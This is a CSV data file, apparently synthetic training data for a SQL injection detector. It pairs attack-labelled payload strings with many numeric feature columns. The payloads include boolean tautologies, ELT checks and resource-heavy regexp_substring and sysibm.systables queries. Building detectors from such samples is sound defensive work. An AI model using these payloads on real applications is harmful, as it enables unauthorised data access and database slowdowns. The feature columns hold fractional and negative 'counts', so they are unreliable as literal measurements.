id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,7.373651608402033,366.8978271484375,61.29710006713867,38.95888900756836,134.26376342773438,0.10157760977745056,92.13204956054688,56.49565124511719,0.9999571442604065,0.3222675025463104,0.2814035415649414,0.4540177285671234,0.09935043752193451,2.809657096862793,3.806777238845825,1.027113914489746,-0.8300914168357849,-0.26994892954826355,-0.1466493159532547,0.06083900108933449,11.760848045349121,6.7229766845703125,2.072819471359253,0.0015969915548339486,2.0734007358551025,-0.002170787425711751,-0.08529979735612869,-0.40457531809806824,-0.20244340598583221,0.5436393618583679,-0.03895760700106621,0.005648399703204632,0.29454806447029114,-0.48955655097961426,-0.5506035685539246,1.7634204626083374,5.604140758514404,3.3116469383239746,-0.02225714921951294,-0.004867387004196644,0.312557190656662,-0.2813216745853424,0.35891053080558777,0.5060765147209167,0.6291825175285339,0.5082581043243408,1.0946823358535767,0.8727872371673584,0.5570600032806396,0.5234266519546509,0.1279626190662384,0.3229307532310486,0.09336152672767639,0.18211203813552856,-0.7163901925086975,0.5133562088012695,0.027553388848900795,0.3913646638393402,0.45488065481185913,0.24578019976615906,-0.021198730915784836,0.8936050534248352,-0.012916909530758858,4.098208904266357,-0.6725815534591675,0.22843462228775024,-0.04133475199341774,0.37053966522216797,0.7030795812606812,-0.16797298192977905,-0.08400113880634308,-0.09231740981340408,-0.13727062940597534,0.08848797529935837,-0.5000229477882385,-0.0068663968704640865,1.89108407497406,0.2478846311569214,-0.005478844046592712,-0.2251581847667694,0.15234380960464478,8.207761764526367,0.9426125288009644,0.7280266284942627,0.5744142532348633,-0.5523640513420105,-0.5759494304656982,-0.8099309206008911,-0.0074866656213998795
GAN_000012,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,5.080438762510038,43.541954040527344,34.16081237792969,-2.4561638832092285,0.4040641784667969,-0.008146755397319794,35.983612060546875,-0.8369258642196655,0.9979525804519653,0.45234525203704834,0.1934119462966919,0.33620792627334595,0.13958117365837097,3.6949009895324707,2.400606870651245,1.8170140981674194,0.2568722367286682,0.05604060739278793,-0.09146363288164139,-0.01837180182337761,-0.8860095739364624,-0.6231893301010132,2.1224021911621094,-0.004224175587296486,0.9597469568252563,0.015951553359627724,-0.0021200510673224926,-0.18562206625938416,-0.46383923292160034,0.7435632944107056,-0.044294629245996475,0.001749357208609581,0.05909665673971176,0.13249042630195618,0.16040533781051636,0.7854806184768677,3.2361841201782227,1.0765762329101562,-0.09824061393737793,-0.007129712961614132,-0.3577170670032501,0.24926194548606873,1.2494595050811768,0.29265403747558594,-0.4245834946632385,-0.3795495927333832,-0.49018824100494385,-0.14881661534309387,-0.003351338440552354,0.19327720999717712,-0.06279297918081284,-0.13772602379322052,-0.01704242080450058,-0.3367617726325989,-0.988624095916748,-0.3355565667152405,0.007950427941977978,0.7414623498916626,0.1791270673274994,0.1725957989692688,0.001099507324397564,-0.22503551840782166,-0.004597147926688194,-0.10140896588563919,-0.6037750244140625,0.019900813698768616,-0.17924879491329193,0.4725598096847534,0.2591601312160492,0.6951779723167419,-0.15658918023109436,-0.04721181094646454,-0.12609541416168213,0.09009542316198349,-0.5657724142074585,-0.004208806902170181,1.04929780960083,0.6037112474441528,-0.0030438583344221115,0.5049352049827576,0.005086719989776611,2.60666823387146,0.9552847743034363,-0.174344003200531,0.4729051887989044,-0.5557525753974915,0.24357695877552032,-0.19040505588054657,-0.044724781066179276
GAN_000013,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,10.017845985936951,410.88031005859375,86.57740020751953,37.71542739868164,133.70579528808594,0.2133157104253769,96.74230194091797,57.15121841430664,0.9995179176330566,0.36437156796455383,0.2860954999923706,0.5056810975074768,0.06332866102457047,2.3503329753875732,4.840953826904297,2.4057130813598633,-1.9586825370788574,-0.3577924370765686,-0.11959213763475418,0.00973094068467617,12.546520233154297,5.707773685455322,2.4950754642486572,-0.001650498597882688,1.9814176559448242,-0.006513059604912996,-0.12308723479509354,-0.3844200670719147,-0.581116795539856,0.5863862633705139,-0.08230505883693695,0.021239440888166428,0.10736379772424698,-0.7055829763412476,-0.9506593346595764,1.5967354774475098,7.486059188842773,4.343428611755371,-0.21641141176223755,-0.00701523432508111,-0.3639267385005951,-0.4566134512424469,0.5780905485153198,1.2287782430648804,0.5515419840812683,0.2630281448364258,1.2292492389678955,1.015436053276062,0.610259473323822,0.5103228092193604,0.1365145593881607,0.3513919413089752,0.0631781667470932,0.4303009510040283,-1.2203291654586792,0.8885414600372314,0.044634029269218445,0.7523158192634583,0.0828053429722786,-0.03129303455352783,-0.019996313378214836,1.2684168815612793,-0.027156008407473564,4.279862880706787,-0.43025878071784973,0.30301669239997864,-0.03052544966340065,0.26393359899520874,0.8891859650611877,-0.11430030316114426,-0.05369921028614044,-0.4148136377334595,-0.4961238205432892,0.1381651759147644,-0.46526098251342773,-0.0023063637781888247,2.302302360534668,0.130695641040802,-0.0012176204472780228,-0.1322643756866455,-0.10653237998485565,8.526679992675781,0.8311733603477478,0.8561896085739136,0.5433446764945984,-0.40594983100891113,-0.4942232668399811,-1.746195912361145,-0.07655734568834305
GAN_000014,attack,boolean,"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'brlc'  =  'brlc",nearest_attack_euclidean,R001040,5.824956269145028,273.4999084472656,41.43893051147461,30.124704360961914,104.99329376220703,0.05552056431770325,44.9194221496582,35.21975326538086,1.0002086162567139,0.24344272911548615,0.2974196970462799,0.44937875866889954,0.12610982358455658,2.905337333679199,2.875582695007324,1.4762219190597534,-0.7574160695075989,-0.20453952252864838,0.1040932834148407,0.04981722682714462,8.845730781555176,6.0923752784729,2.058049201965332,0.0005886756116524339,1.7018325328826904,-0.006013297941535711,-0.071345753967762,-0.14293524622917175,-0.1207798570394516,0.10113874077796936,-0.048142869025468826,0.007254103664308786,0.27188828587532043,-0.7830951809883118,-0.5033127069473267,1.6445705890655518,7.625372886657715,2.591855049133301,-0.03425806760787964,-0.01276036910712719,-0.051411863416433334,-0.4425765573978424,0.5409224629402161,0.0907687395811081,0.2390611469745636,0.09152904897928238,0.640447735786438,0.5642350912094116,0.5298036932945251,0.2962341010570526,0.09786271303892136,0.2639843225479126,0.26823097467422485,0.24273356795310974,-0.555165708065033,0.6092984676361084,0.03204889968037605,-0.1233777180314064,0.03140265494585037,0.2630774676799774,-0.010736681520938873,0.46458354592323303,-0.01278070081025362,1.7533152103424072,-0.2510422468185425,0.14857427775859833,-0.05896269902586937,-0.10125907510519028,0.6903307437896729,0.12723177671432495,-0.21904240548610687,0.16185316443443298,-0.28075990080833435,0.024902107194066048,-0.1273413449525833,-0.0043140072375535965,1.4438811540603638,0.5506531000137329,0.000343459309078753,0.09819000959396362,0.05907030031085014,6.948330402374268,0.9582033753395081,0.6053625345230103,0.5153615474700928,-0.2623615264892578,-0.37281522154808044,-0.7203288078308105,-0.03598446026444435
GAN_000015,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R002475,3.8174520906248626,127.10094451904297,47.84832763671875,10.650290489196777,33.23244094848633,0.007410153280943632,51.99888610839844,13.363534927368164,0.9979242086410522,0.4593483805656433,0.16154129803180695,0.3337076008319855,0.13991566002368927,3.776724338531494,2.443696975708008,1.003880500793457,0.18481528759002686,-0.0061611272394657135,-0.11821342259645462,0.002465446013957262,1.8871771097183228,2.4832959175109863,2.196960687637329,-0.010129546746611595,1.250937819480896,0.014075472950935364,0.0010323644382879138,-0.0015371412737295032,-0.9977595806121826,0.8868952989578247,-0.026981279253959656,-0.0021558082662522793,0.07887836545705795,0.14175483584403992,0.14478302001953125,1.1747541427612305,4.512305736541748,1.491092562675476,-0.022047698497772217,-0.007407104130834341,-0.06039130315184593,0.3418257534503937,0.8754875063896179,0.02607688307762146,-0.1988528072834015,-0.12980960309505463,-0.20959866046905518,0.00016532068548258394,0.11748586595058441,0.25300952792167664,0.04056338965892792,-0.06322096288204193,0.006105639040470123,-0.22300072014331818,-0.7054141163825989,-0.3427639603614807,0.003194222692400217,0.5476090312004089,0.13542482256889343,0.36721742153167725,-0.00040024815825745463,-0.23178580403327942,-0.00508145522326231,0.8786144852638245,-0.5760803818702698,0.06323160976171494,-0.12964878976345062,0.17519812285900116,0.1712317317724228,0.3409077823162079,-0.14181117713451385,0.10949520021677017,-0.12714380025863647,0.06292847543954849,-0.5314623117446899,-0.007364129647612572,1.2435221672058105,0.48710939288139343,-0.006678322330117226,0.3133370578289032,0.002575606107711792,4.167322158813477,0.9502822756767273,-0.061126530170440674,0.4576718509197235,-0.4221038818359375,-0.04217122122645378,-0.08058249950408936,-0.0066521987318992615
GAN_000016,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,5.929712351887965,293.7274475097656,78.62200927734375,32.160606384277344,97.97978973388672,0.028230862691998482,81.21341705322266,46.24700164794922,0.9983358383178711,0.4106270670890808,0.1612120121717453,0.3759334981441498,0.102687306702137,3.170198917388916,3.583455801010132,0.3975992798805237,0.35885685682296753,-0.1703563928604126,-0.2320493757724762,-0.0029145809821784496,10.288275718688965,4.084496974945068,1.799494743347168,0.01720735803246498,1.8562521934509277,0.017606815323233604,-0.021245550364255905,-0.4336148798465729,-0.009115652181208134,0.9387933015823364,-0.04390963912010193,0.003321554744616151,0.14910073578357697,-0.059494033455848694,0.03515767306089401,1.6037511825561523,3.546713352203369,2.7100157737731934,0.38693007826805115,-0.001159930950962007,0.5207191109657288,0.24611695110797882,0.6724564433097839,0.472819447517395,0.604292094707489,0.08662129193544388,0.5561733841896057,0.5232231020927429,0.3518604636192322,0.5074716210365295,0.07962586730718613,0.2203684002161026,0.09208644926548004,0.06783774495124817,-0.8624836206436157,0.07340222597122192,0.038682036101818085,0.5733349919319153,0.3021189868450165,0.24667665362358093,-0.011239678598940372,0.26538383960723877,-0.0074037108570337296,4.095051288604736,-0.4218844771385193,0.206883043050766,-0.014372322708368301,0.24734683334827423,0.29745781421661377,-0.03894061595201492,-0.07467640936374664,-0.3682652711868286,-0.0029546841979026794,0.09435753524303436,-0.6147005558013916,-0.00403617275878787,1.507920742034912,0.10487434267997742,-0.00428299093618989,-0.1619567573070526,0.19574949145317078,7.493613243103027,0.9404385685920715,0.08782992511987686,0.4195016920566559,-0.39768391847610474,-0.1553424447774887,-0.7371513843536377,0.027440069243311882
GAN_000017,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kbkz'  =  'kbkz",nearest_attack_euclidean,R001474,6.692472007091616,176.30152893066406,21.651233673095703,22.246597290039062,77.00389862060547,-0.048955485224723816,22.21750259399414,20.210613250732422,0.9992045164108276,0.1892728954553604,0.31015676259994507,0.4440149962902069,0.11964661628007889,2.813614845275879,3.952207326889038,1.7965130805969238,-1.0661756992340088,-0.22893424332141876,0.17203611135482788,0.03812815621495247,8.738862037658691,3.0955238342285156,1.2401752471923828,0.025317873805761337,1.3837790489196777,0.00207715667784214,-0.06749983131885529,-0.4756467044353485,0.30965742468833923,-0.24944964051246643,-0.0977684035897255,0.007408312056213617,0.16845858097076416,-0.7491552233695984,-0.6967946887016296,1.4201960563659668,6.716719627380371,2.339193820953369,-0.449579119682312,-0.02022538147866726,-0.050991471856832504,-0.5518438220024109,0.8531582951545715,0.12011784315109253,0.44647687673568726,-0.22290605306625366,0.507537305355072,0.5211360454559326,0.554469883441925,0.44755426049232483,0.11790519207715988,0.24288637936115265,0.2847415506839752,0.30948561429977417,-1.0531514883041382,0.3868926763534546,0.011803963221609592,-0.01999732293188572,-0.036694884300231934,0.5619585514068604,-0.008193721063435078,0.6315041184425354,-0.01599532924592495,0.5739073753356934,-0.1997605562210083,0.20550215244293213,-0.14792178571224213,-0.050099197775125504,0.9062951803207397,0.14653711020946503,-0.6706662774085999,-0.12680679559707642,-0.10617014020681381,0.052364129573106766,-0.36708077788352966,-0.005506264045834541,1.2288932800292969,0.30284178256988525,0.0015801341505721211,0.19257473945617676,-0.019188620150089264,5.2792510986328125,1.1009290218353271,0.5514917969703674,0.2820366621017456,-0.36228564381599426,-0.10827142000198364,-0.7445753216743469,-0.052308421581983566
GAN_000018,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'rtbm'  =  'rtbm",nearest_attack_euclidean,R000582,8.354926454766685,188.00172424316406,102.85260772705078,10.138649940490723,31.253904342651367,0.1257251501083374,113.67542266845703,35.763301849365234,0.9933968186378479,0.7185953855514526,-0.02832239866256714,0.2599261701107025,0.08608739078044891,3.750271797180176,3.6352765560150146,1.0123306512832642,1.1675488948822021,-0.20008958876132965,-0.6166644096374512,-0.1563296914100647,3.3530149459838867,-0.7290433645248413,1.872532844543457,0.034301504492759705,1.5687247514724731,0.05046835541725159,0.060697607696056366,-0.5619029402732849,-1.0119187831878662,2.2485170364379883,-0.05343971028923988,-0.0016695379745215178,0.17139549553394318,0.8729351162910461,0.5858985185623169,1.178143858909607,-1.4527734518051147,2.2799172401428223,0.5529404878616333,-0.005642872303724289,0.605381190776825,1.0314013957977295,1.3199589252471924,0.8351379036903381,0.5390069484710693,-0.5833513736724854,-0.32974013686180115,-0.13934987783432007,0.18107743561267853,0.6385633945465088,-0.013816200196743011,-0.13586930930614471,-0.5108439326286316,-0.395391583442688,-1.742061734199524,-0.8749817609786987,0.059306126087903976,1.6551498174667358,0.24207395315170288,0.5882193446159363,0.004035100340843201,-0.03629062697291374,-0.0065201953984797,2.6493496894836426,-0.4145360291004181,0.2838103473186493,-0.05962994322180748,0.8481296896934509,-0.20505879819393158,0.4635488986968994,-0.29299187660217285,-1.0754438638687134,0.027814216911792755,0.048944082111120224,-1.3921633958816528,-0.008982950821518898,1.8458802700042725,0.06676971912384033,-0.006837756372988224,0.003575393697246909,-0.13681253790855408,3.562389850616455,1.0396167039871216,-0.8144800662994385,0.4903736710548401,-0.6845131516456604,0.04700809717178345,-0.9721477031707764,0.09100712090730667
GAN_000019,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.403050839376102,106.94377899169922,41.7519416809082,12.2701416015625,41.46833801269531,-0.03789891302585602,18.07792091369629,13.05089282989502,0.998655378818512,0.27130237221717834,0.22444187104701996,0.3870360851287842,0.1276175081729889,3.2949788570404053,3.0295088291168213,1.571205735206604,0.12037980556488037,-0.13546162843704224,0.15654750168323517,-0.024325555190443993,5.604101181030273,1.6823309659957886,1.6442830562591553,0.019722336903214455,1.1828484535217285,0.006837853230535984,0.00958735216408968,-0.2736714780330658,0.13785706460475922,0.2661187946796417,-0.057878416031599045,0.0015557374572381377,0.21213163435459137,-0.1837376207113266,0.00985863246023655,1.314713954925537,4.042052745819092,1.6574442386627197,0.00922083854675293,-0.015414895489811897,0.13098245859146118,-0.08039132505655289,0.9622824788093567,0.08609285950660706,0.034563735127449036,-0.43237462639808655,-0.05317254364490509,0.11701644212007523,0.3519282042980194,0.3542894423007965,0.013170681893825531,0.020106257870793343,0.13655921816825867,0.22011977434158325,-0.8715423941612244,-0.1450626105070114,0.025219187140464783,-0.10488597303628922,0.0693393126130104,0.6033625602722168,-0.0016421577893197536,-0.06385735422372818,-0.00514773465692997,-0.5319153070449829,-0.06659264117479324,0.11902891844511032,-0.11496414244174957,-0.20593315362930298,0.48401936888694763,0.16302016377449036,-0.22018684446811676,-0.006827462464570999,-0.05912051349878311,0.024506323039531708,-0.15140098333358765,-0.00798997562378645,1.0708889961242676,0.6336533427238464,0.00110522098839283,0.21673406660556793,-0.04108098894357681,3.648953437805176,1.0411008596420288,0.12441793084144592,0.4974283277988434,-0.08908790349960327,0.20896245539188385,-0.5395234227180481,-0.0019274241058155894
GAN_000020,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,8.344113857994884,272.6500244140625,45.47565460205078,27.98296356201172,102.68058776855469,0.09230290353298187,79.71992492675781,36.757686614990234,0.9974511861801147,0.3593827486038208,0.2427188903093338,0.4337056875228882,0.09264828264713287,2.8282470703125,4.887308120727539,1.3804223537445068,-1.9762420654296875,-0.33806613087654114,-0.2582518458366394,0.003338401671499014,12.380143165588379,4.397737503051758,0.8891875743865967,0.0243354644626379,1.65071702003479,0.014688191004097462,-0.07374262809753418,-0.7336534857749939,-1.0138719081878662,0.3600737154483795,-0.09312360733747482,0.008142968639731407,0.18357409536838531,-0.7951193451881409,-0.9132123589515686,1.4238717555999756,6.266773223876953,3.388762950897217,-0.64681077003479,-0.014211812987923622,0.03434974327683449,-0.3841898739337921,0.9161827564239502,0.3061424493789673,1.037451982498169,-0.14585092663764954,0.6071420311927795,0.6781910061836243,0.6080882549285889,0.7074296474456787,0.1284424364566803,0.2407408207654953,0.5618755221366882,0.3702291250228882,-1.294787883758545,0.2494850903749466,0.0029272744432091713,0.2092217206954956,0.39201387763023376,0.5306446552276611,-0.008923676796257496,0.6454280018806458,-0.018867453560233116,1.5286973714828491,-0.41268566250801086,0.3461853265762329,-0.1801159679889679,0.42555302381515503,0.6424755454063416,-0.13865438103675842,-0.856875479221344,0.12379872053861618,-0.42976921796798706,0.07969073951244354,-1.090836524963379,-0.012356607243418694,1.7167465686798096,0.15684854984283447,-0.0015694444300606847,-0.060387738049030304,0.22004728019237518,6.54744815826416,1.1471704244613647,0.22246143221855164,0.4787482023239136,-0.6790934801101685,-0.14451870322227478,-0.8419780135154724,-0.005581515841186047
GAN_000021,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",nearest_attack_euclidean,R002426,6.595305639917319,134.72161865234375,15.560599327087402,18.132568359375,56.944129943847656,-0.001855656853877008,12.981181144714355,7.855964183807373,1.0008097887039185,0.1416836977005005,0.32358062267303467,0.4863587021827698,0.12388696521520615,2.806119918823242,3.138389825820923,2.676041841506958,-0.8008145689964294,-0.14187084138393402,0.4310395419597626,0.017850734293460846,4.637039661407471,3.5898072719573975,1.7894058227539062,0.01949763298034668,1.1905794143676758,-0.0075186751782894135,-0.06604021042585373,-0.03190433606505394,0.3764188885688782,-0.3636249601840973,-0.0725020170211792,0.009314965456724167,0.19651208817958832,-0.69437175989151,-0.6105121970176697,1.2601215839385986,6.926918029785156,2.1287591457366943,-0.3747480511665344,-0.02004164643585682,-0.5428943634033203,-0.613794207572937,0.6484825015068054,0.13101427257061005,-0.28598877787590027,-0.13809362053871155,0.1795981377363205,0.48340094089508057,0.48951202630996704,0.1746041625738144,0.1014207974076271,0.17594753205776215,-0.07456307113170624,0.39908602833747864,-0.8740039467811584,0.5327239632606506,0.022520825266838074,0.03041219525039196,-0.4646186828613281,0.12636227905750275,-0.0051758731715381145,0.730157196521759,-0.019293153658509254,-0.4850040674209595,-0.010620770044624805,0.07384148240089417,-0.1347498744726181,-0.25111132860183716,0.9474997520446777,0.27736011147499084,-0.25530725717544556,-0.12899823486804962,-0.3267619013786316,0.02808254584670067,0.14455458521842957,-3.8560065149795264e-05,1.1226309537887573,0.4875125288963318,0.006180272903293371,0.37618762254714966,-0.3507044315338135,3.8055574893951416,0.9811067581176758,0.7937253713607788,0.0910370945930481,0.023709893226623535,-0.08110521733760834,-0.84019935131073,-0.1009824126958847
GAN_000022,attack,boolean,"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied",nearest_attack_euclidean,R001991,6.820026893267288,202.82493591308594,78.81852722167969,16.259952545166016,35.13039016723633,0.10141835361719131,86.88258361816406,27.49414825439453,0.9951003193855286,0.5725439786911011,0.03835946321487427,0.32450008392333984,0.0930354967713356,3.5734200477600098,3.26967716217041,1.6594403982162476,0.9242237210273743,-0.15680749714374542,-0.39986318349838257,-0.10954290628433228,4.0571160316467285,1.4317938089370728,1.7069573402404785,0.03399563208222389,1.5046967267990112,0.04309353604912758,0.05562202259898186,-0.5070745944976807,-0.062000975012779236,1.7204352617263794,-0.05260692909359932,0.0032475562766194344,0.04527938365936279,0.5684729218482971,0.22877155244350433,1.1977850198745728,0.7612348794937134,2.1371045112609863,0.05127918720245361,-0.010663548484444618,0.5282884240150452,0.7716718316078186,1.1154706478118896,0.7230269312858582,0.4769827127456665,-0.43444952368736267,-0.1299578994512558,0.009699918329715729,0.22811925411224365,0.5989676713943481,0.06970470398664474,-0.0058895922265946865,-0.2408202439546585,0.08023293316364288,-1.5893672704696655,-0.3510744571685791,0.04644111171364784,1.5375038385391235,0.36527764797210693,0.23846501111984253,0.0029173803050071,0.14956602454185486,-0.010156688280403614,1.63163161277771,-0.4249558448791504,0.1936078667640686,-0.061788950115442276,0.7017992734909058,0.018355822190642357,0.37845441699028015,-0.4695689082145691,-0.7014904618263245,-0.2308240830898285,0.05579870939254761,-1.0543526411056519,-0.004991778172552586,1.6673892736434937,-0.010687707923352718,-0.005222631618380547,0.03401791304349899,-0.19946840405464172,2.911574363708496,0.9541495442390442,-0.5396331548690796,0.35600751638412476,-0.7522210478782654,0.0878220945596695,-0.7763670682907104,0.058078229427337646
GAN_000023,attack,boolean,"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'brlc'  =  'brlc",nearest_attack_euclidean,R001040,7.363779023512648,269.2328186035156,53.3427619934082,18.994293212890625,87.49235534667969,0.07810955494642258,63.741390228271484,25.96342658996582,0.9996354579925537,0.4359726011753082,0.28994810581207275,0.44116145372390747,0.10636364668607712,3.0150651931762695,4.131547927856445,1.9661345481872559,-2.0452916622161865,-0.16700884699821472,-0.0986267551779747,0.026940934360027313,7.152854919433594,3.5021462440490723,2.6907410621643066,-0.011872266419231892,1.2944326400756836,-0.009226037189364433,-0.11000088602304459,-0.3856370151042938,-1.550672173500061,0.12535929679870605,-0.06501399725675583,0.016973009333014488,0.10302984714508057,-0.7576029300689697,-0.6928878426551819,1.1012061834335327,8.427786827087402,3.216372489929199,-0.21545124053955078,-0.00327867129817605,-0.7403547763824463,-0.50330650806427,0.6894218921661377,0.41588932275772095,-0.1337714046239853,-0.04503642022609711,0.5600460767745972,0.5357638597488403,0.33896109461784363,0.3436760902404785,-0.01687992364168167,0.1599336862564087,0.18192161619663239,0.058977365493774414,-0.737388014793396,0.5976004004478455,0.01295532751828432,0.4182073473930359,0.3626425862312317,0.2634897232055664,-0.016098065301775932,0.5834905505180359,-0.017141956835985184,2.0862228870391846,-0.5837094783782959,0.1894712895154953,-0.17388400435447693,0.2687673568725586,0.7840952277183533,0.3585379719734192,-0.20614732801914215,0.17522722482681274,-0.3266676366329193,0.12478386610746384,-0.4241538643836975,-0.007772650104016066,1.5832473039627075,0.7451778650283813,-0.0005114261293783784,0.20454750955104828,0.16590923070907593,7.032691955566406,0.9530755281448364,0.43501919507980347,0.7294074892997742,-0.4809478521347046,-0.04290799796581268,-0.8167718052864075,-0.0836326852440834
